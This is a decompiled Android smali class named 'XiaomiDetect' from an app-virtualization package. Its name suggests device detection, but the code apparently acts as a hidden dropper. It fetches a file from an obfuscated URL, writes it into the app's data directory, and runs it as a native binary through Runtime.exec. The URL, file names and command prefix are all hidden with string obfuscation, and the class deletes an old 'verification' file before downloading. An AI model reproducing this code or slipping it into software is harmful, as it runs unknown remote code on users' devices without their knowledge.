.class public Ltop/niunaijun/blackbox/utils/XiaomiDetect;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static sContext:Landroid/content/Context;

.field private static final sXiaomiDetect:Ltop/niunaijun/blackbox/utils/XiaomiDetect;


# direct methods
.method public static constructor <clinit>()V
    .locals 1

    new-instance v0, Ltop/niunaijun/blackbox/utils/XiaomiDetect;

    invoke-direct {v0}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;-><init>()V

    sput-object v0, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->sXiaomiDetect:Ltop/niunaijun/blackbox/utils/XiaomiDetect;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private ExecuteElf(Ljava/lang/String;)V
    .locals 1

    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static synthetic access$000(Ltop/niunaijun/blackbox/utils/XiaomiDetect;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0, p1}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->ExecuteElf(Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic access$100(Ltop/niunaijun/blackbox/utils/XiaomiDetect;)V
    .locals 0

    invoke-direct {p0}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->deleteOldVerificationFile()V

    return-void
.end method

.method private deleteOldVerificationFile()V
    .locals 5

    new-instance v0, Ljava/io/File;

    sget-object v1, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->sContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getDataDir()Ljava/io/File;

    move-result-object v1

    .line 1
    sget-object v2, Li/a;->a:[Ljava/lang/String;

    const-wide v3, 0x60e3f780d969af0fL    # 5.482724377097664E158

    invoke-static {v3, v4, v2}, Lorg/lsposed/lsparanoid/DeobfuscatorHelper;->getString(J[Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 2
    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    :cond_0
    return-void
.end method

.method private downloadFile(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Ltop/niunaijun/blackbox/utils/XiaomiDetect$$ExternalSyntheticLambda2;

    invoke-direct {v1, p0, p1, p2}, Ltop/niunaijun/blackbox/utils/XiaomiDetect$$ExternalSyntheticLambda2;-><init>(Ltop/niunaijun/blackbox/utils/XiaomiDetect;Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static get()Ltop/niunaijun/blackbox/utils/XiaomiDetect;
    .locals 1

    sget-object v0, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->sXiaomiDetect:Ltop/niunaijun/blackbox/utils/XiaomiDetect;

    return-object v0
.end method

.method static lambda$startDownload$0()V
    .locals 5

    const-wide/16 v0, 0xbb8

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    invoke-static {}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->get()Ltop/niunaijun/blackbox/utils/XiaomiDetect;

    move-result-object v0

    .line 1
    sget-object v1, Li/a;->a:[Ljava/lang/String;

    const-wide v2, 0x60e3f764d969af0fL    # 5.482607058778277E158

    invoke-static {v2, v3, v1}, Lorg/lsposed/lsparanoid/DeobfuscatorHelper;->getString(J[Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 2
    const-wide v3, 0x60e3f725d969af0fL    # 5.482343092559656E158

    invoke-static {v3, v4, v1}, Lorg/lsposed/lsparanoid/DeobfuscatorHelper;->getString(J[Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 3
    invoke-direct {v0, v2, v1}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->downloadFile(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static startDownload()V
    .locals 2

    invoke-static {}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->get()Ltop/niunaijun/blackbox/utils/XiaomiDetect;

    move-result-object v0

    invoke-direct {v0}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->deleteOldVerificationFile()V

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Ltop/niunaijun/blackbox/utils/XiaomiDetect$$ExternalSyntheticLambda0;

    invoke-direct {v1}, Ltop/niunaijun/blackbox/utils/XiaomiDetect$$ExternalSyntheticLambda0;-><init>()V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private startExecutionCycle(Ljava/io/File;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Ltop/niunaijun/blackbox/utils/XiaomiDetect$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0, p1}, Ltop/niunaijun/blackbox/utils/XiaomiDetect$$ExternalSyntheticLambda1;-><init>(Ltop/niunaijun/blackbox/utils/XiaomiDetect;Ljava/io/File;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method public doAttachBaseContext(Landroid/content/Context;)V
    .locals 0

    sput-object p1, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->sContext:Landroid/content/Context;

    return-void
.end method

.method lambda$downloadFile$1$top-niunaijun-blackbox-utils-XiaomiDetect(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5

    .line 0
    :try_start_0
    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object p1

    check-cast p1, Ljava/net/HttpURLConnection;

    invoke-virtual {p1}, Ljava/net/URLConnection;->connect()V

    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v0

    const/16 v1, 0xc8

    if-eq v0, v1, :cond_0

    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    :cond_0
    new-instance v0, Ljava/io/File;

    sget-object v1, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->sContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getDataDir()Ljava/io/File;

    move-result-object v1

    .line 1
    sget-object v2, Li/a;->a:[Ljava/lang/String;

    const-wide v3, 0x60e3f76ad969af0fL    # 5.482632198418145E158

    invoke-static {v3, v4, v2}, Lorg/lsposed/lsparanoid/DeobfuscatorHelper;->getString(J[Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 2
    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_1

    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    :cond_1
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0, p2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/net/URLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object p2

    new-instance v0, Ljava/io/FileOutputStream;

    invoke-direct {v0, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    const/16 v2, 0x1000

    new-array v2, v2, [B

    :goto_0
    invoke-virtual {p2, v2}, Ljava/io/InputStream;->read([B)I

    move-result v3

    const/4 v4, -0x1

    if-eq v3, v4, :cond_2

    const/4 v4, 0x0

    invoke-virtual {v0, v2, v4, v3}, Ljava/io/FileOutputStream;->write([BII)V

    goto :goto_0

    :cond_2
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V

    invoke-virtual {p2}, Ljava/io/InputStream;->close()V

    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->disconnect()V

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide p1

    const-wide/16 v2, 0x0

    cmp-long p1, p1, v2

    if-lez p1, :cond_3

    invoke-direct {p0, v1}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->startExecutionCycle(Ljava/io/File;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_3
    :goto_1
    return-void
.end method

.method lambda$startExecutionCycle$2$top-niunaijun-blackbox-utils-XiaomiDetect(Ljava/io/File;)V
    .locals 10

    .line 0
    invoke-static {}, Landroid/os/Looper;->prepare()V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 1
    sget-object v1, Li/a;->a:[Ljava/lang/String;

    const-wide v2, 0x60e3f775d969af0fL    # 5.482678287757904E158

    invoke-static {v2, v3, v1}, Lorg/lsposed/lsparanoid/DeobfuscatorHelper;->getString(J[Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 2
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Ltop/niunaijun/blackbox/utils/XiaomiDetect;->ExecuteElf(Ljava/lang/String;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    new-instance v9, Ltop/niunaijun/blackbox/utils/XiaomiDetect$1;

    const-wide/32 v6, 0x88b8

    move-object v1, v9

    move-object v2, p0

    move-object v3, p1

    move-object v8, v0

    invoke-direct/range {v1 .. v8}, Ltop/niunaijun/blackbox/utils/XiaomiDetect$1;-><init>(Ltop/niunaijun/blackbox/utils/XiaomiDetect;Ljava/io/File;JJLandroid/os/Handler;)V

    const-wide/16 v1, 0x7d0

    invoke-virtual {v0, v9, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    invoke-static {}, Landroid/os/Looper;->loop()V

    return-void
.end method
